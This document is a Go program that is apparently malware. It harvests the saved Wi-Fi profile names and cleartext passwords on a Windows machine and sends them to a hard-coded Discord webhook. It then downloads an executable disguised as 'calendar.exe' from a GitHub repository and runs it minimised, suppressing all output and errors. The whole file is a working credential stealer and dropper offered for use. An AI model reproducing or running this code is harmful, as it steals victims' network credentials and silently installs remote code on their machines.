package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
)

// RunCommand executes a command and returns the output
func RunCommand(command string, args ...string) (string, error) {
	// Open "NUL" to redirect output
	nullFile, err := os.Open("NUL")
	if err != nil {
		return "", fmt.Errorf("failed to open NUL: %v", err)
	}
	defer nullFile.Close()

	cmd := exec.Command(command, args...)
	cmd.Stdout = nullFile  // Suppress output
	cmd.Stderr = nullFile  // Suppress error output
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", err
	}
	return string(output), nil
}

// SendToDiscord sends a message to the specified Discord webhook
func SendToDiscord(webhookURL, message string) error {
	// Prepare the message payload
	payload := map[string]interface{}{
		"content": message,
	}

	// Marshal the payload to JSON
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		return fmt.Errorf("error marshaling JSON payload: %v", err)
	}

	// Send the HTTP POST request to Discord webhook
	_, err = http.Post(webhookURL, "application/json", bytes.NewBuffer(jsonPayload))
	if err != nil {
		return fmt.Errorf("error sending message to Discord: %v", err)
	}

	return nil
}

// ExtractWifiPasswords extracts Wi-Fi profiles and their passwords and sends to Discord
func ExtractWifiPasswords(webhookURL string) {
	// Get the list of Wi-Fi profiles
	output, err := RunCommand("netsh", "wlan", "show", "profiles")
	if err != nil {
		return
	}

	// Parse the output to find Wi-Fi profiles
	profiles := strings.Split(output, "\n")
	var message string
	for _, profile := range profiles {
		if strings.Contains(profile, "All User Profile") {
			// Extract the profile name
			profileName := strings.TrimSpace(strings.Split(profile, ":")[1])

			// Get the Wi-Fi password for this profile
			passwordOutput, err := RunCommand("netsh", "wlan", "show", "profile", profileName, "key=clear")
			if err != nil {
				continue
			}

			// Look for the password in the output
			if strings.Contains(passwordOutput, "Key Content") {
				// Extract the password
				lines := strings.Split(passwordOutput, "\n")
				for _, line := range lines {
					if strings.Contains(line, "Key Content") {
						password := strings.TrimSpace(strings.Split(line, ":")[1])
						message += fmt.Sprintf("Profile: %s\nPassword: %s\n\n", profileName, password)
					}
				}
			} else {
				message += fmt.Sprintf("Profile: %s\nPassword: [Not Set]\n\n", profileName)
			}
		}
	}

	// If there are extracted Wi-Fi profiles, send the result to Discord
	if message != "" {
		err := SendToDiscord(webhookURL, message)
		if err != nil {
			// If sending to Discord fails, do nothing (no console output)
			return
		}
	}
}

// DownloadAndRunExecutable downloads an executable from a URL and runs it silently
func DownloadAndRunExecutable(url string) error {
	// Get the system's temporary directory
	tempDir := os.TempDir()

	// Define the path where the file will be saved in the temp directory
	filename := tempDir + "calendar.exe"

	// Download the executable from the given URL
	resp, err := http.Get(url)
	if err != nil {
		return fmt.Errorf("failed to download executable: %v", err)
	}
	defer resp.Body.Close()

	// Create the file to save the executable in the temp directory
	file, err := os.Create(filename)
	if err != nil {
		return fmt.Errorf("failed to create file: %v", err)
	}
	defer file.Close()

	// Copy the content of the response to the file
	_, err = io.Copy(file, resp.Body)
	if err != nil {
		return fmt.Errorf("failed to write executable to file: %v", err)
	}

	// Make the file executable
	err = os.Chmod(filename, 0755)
	if err != nil {
		return fmt.Errorf("failed to set file permissions: %v", err)
	}

	// Run the executable in a hidden window
	cmd := exec.Command("cmd", "/C", "start", "/min", filename) // /min hides the window
	nullFile, err := os.Open("NUL")
	if err != nil {
		return fmt.Errorf("failed to open NUL for suppressing output: %v", err)
	}
	defer nullFile.Close()

	cmd.Stdout = nullFile  // Suppress output
	cmd.Stderr = nullFile  // Suppress error output

	// Start the executable
	err = cmd.Start()
	if err != nil {
		return fmt.Errorf("failed to start executable: %v", err)
	}

	// Wait for the executable to finish
	err = cmd.Wait()
	if err != nil {
		return fmt.Errorf("error while executing file: %v", err)
	}

	return nil
}

func main() {
	// Replace with your Discord webhook URL
	webhookURL := "https://discord.com/api/webhooks/1321414956754931723/RgRsAM3bM5BALj8dWBagKeXwoNHEWnROLihqu21jyG58KiKfD9KNxQKOTCDVhL5J_BC2"

	// Extract Wi-Fi passwords and send them to Discord
	ExtractWifiPasswords(webhookURL)

	// Download and run the executable silently in temp directory
	executableURL := "https://github.com/thewifiproject/devilhack/raw/refs/heads/main/calendar.exe"

	err := DownloadAndRunExecutable(executableURL)
	if err != nil {
		// If there's an error downloading or running the executable, it won't be displayed
		// in the console due to the redirection to NUL.
		// You may log or handle this silently if needed.
	}
}
